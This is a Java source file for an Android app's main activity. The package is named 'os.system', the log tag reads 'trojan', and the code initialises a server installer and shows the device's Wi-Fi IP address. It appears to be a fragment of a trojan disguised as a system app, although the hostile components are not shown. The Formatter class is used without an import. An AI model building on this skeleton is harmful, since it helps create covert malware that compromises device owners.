package os.system;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;
import java.io.DataOutputStream;
import java.io.DataInputStream;
import android.widget.NumberPicker.*;
import android.net.wifi.*;

public class MainActivity extends Activity
{
    private static String TAG = "trojan";
    private ServerUtils utils;
    private Installer installator;
    private String pathToInstallServer;
    private String docFolder;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		//startService(new Intent(this, System.class));

		utils = new ServerUtils(this);
        pathToInstallServer = utils.getPathToInstallServer();
        docFolder = utils.getDocFolder();

        installator = new Installer(this, true);
        
	}

	public void btn(View v) {
		WifiManager wm = (WifiManager)getSystemService(WIFI_SERVICE);
		String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
		Toast.makeText(this, ""+ip, Toast.LENGTH_LONG).show();
	}

	

}
